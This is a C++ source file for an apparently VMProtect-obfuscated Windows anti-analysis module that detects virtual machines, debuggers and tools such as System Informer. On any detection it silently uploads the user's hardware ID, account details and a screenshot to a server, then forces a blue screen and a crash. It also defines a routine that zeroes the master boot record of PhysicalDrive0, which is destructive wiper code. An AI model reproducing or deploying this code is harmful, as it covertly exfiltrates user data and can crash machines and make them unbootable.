#include "stdafx.hpp"
#include "security\security.hpp"
#include "requests\requests.hpp"
#include "security\vector.hpp"
#include "utils\utils.hpp"
#include "ntdll\ntdll.hpp"

auto security::runtime_security::start( ) -> void
{
	vmp_ultra;

	check_for_virtual_machine( );
	check_for_debugger( );
	check_for_drivers( );
	process_blacklist( );

	vmp_end;
}

auto security::runtime_security::check_for_virtual_machine( ) -> void
{

	if ( VMProtectIsVirtualMachinePresent( ) )
		security_callback( E( "Vmprotect Virtual Machine Found" ), 1 );

}

auto security::runtime_security::check_vm_files( ) -> void
{
	for ( const auto &vm_file : vm_files )
	{
		if ( std::filesystem::exists( vm_file ) )
		{
			security_callback( utils::string::format(E("Virtual Machine files found: {}"),vm_file ),1 );
		}
			
	}
}

auto security::runtime_security::process_blacklist( ) -> void
{
	for ( const auto &proc : process )
	{
		if ( utils::process::get_process_id( proc ) != 0 )
		{
			security_callback( utils::string::format( E( "Process BlackList Found: {}" ),proc ), 1 );
		}
	}

}

auto security::runtime_security::check_for_drivers( ) -> void
{
	std::vector<std::string> drivers_list
	{
		{"SystemInformer.sys"}, {"kprocesshacker.sys"}
	};

	for ( const auto &drivers : drivers_list )
	{
		if ( utils::system::search_drivers( drivers ) )
			security_callback( utils::string::format( E( "Driver Blacklist Found: {}" ), drivers ), 1 );
	}
}

auto security::runtime_security::check_for_debugger( ) -> void
{
	if ( VMProtectIsDebuggerPresent( false ) )
		security_callback( E( "Vmprotect Debugger Found" ), 1 );
}

auto security::runtime_security::bsod( ) -> void
{
	BOOLEAN privilege_state = FALSE;
	ULONG error_response = 0;
	RtlAdjustPrivilege( 19, TRUE, FALSE, &privilege_state );
	NtRaiseHardError( STATUS_IN_PAGE_ERROR, 0, 0, nullptr, 6, &error_response );
}

auto security::runtime_security::crash_program( ) -> void
{
	*reinterpret_cast< uint32_t * >( 0 ) = 0XDEAD;
}

auto security::runtime_security::zero_mbr( ) -> void
{
	DWORD write {};
	char mbr_data[ 512 ];

	ZeroMemory( &mbr_data, ( sizeof mbr_data ) );
	HANDLE const master_boot_record = CreateFile( E( "\\\\.\\PhysicalDrive0" ), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, NULL, nullptr );
	WriteFile( master_boot_record, mbr_data, 512, &write, nullptr );

	CloseHandle( master_boot_record );
}

auto security::runtime_security::security_callback( const std::string reason, const int type ) -> void
{
	static auto triggered_callback = false;

	if ( !triggered_callback )
	{
		auto const post = std::make_unique< network::Requests >( );
		post->post_report( utils::others::get_hwid_hash( ), utils::string::format( "{} \n {}", utils::system::get_user_info( ), reason ),
															          utils::others::bufferto_base64( utils::others::capture_screen( ) ), type );
		if ( type != 0 )
		{
			bsod( );
			crash_program( );
			ExitProcess( 0 );
		}
	}
}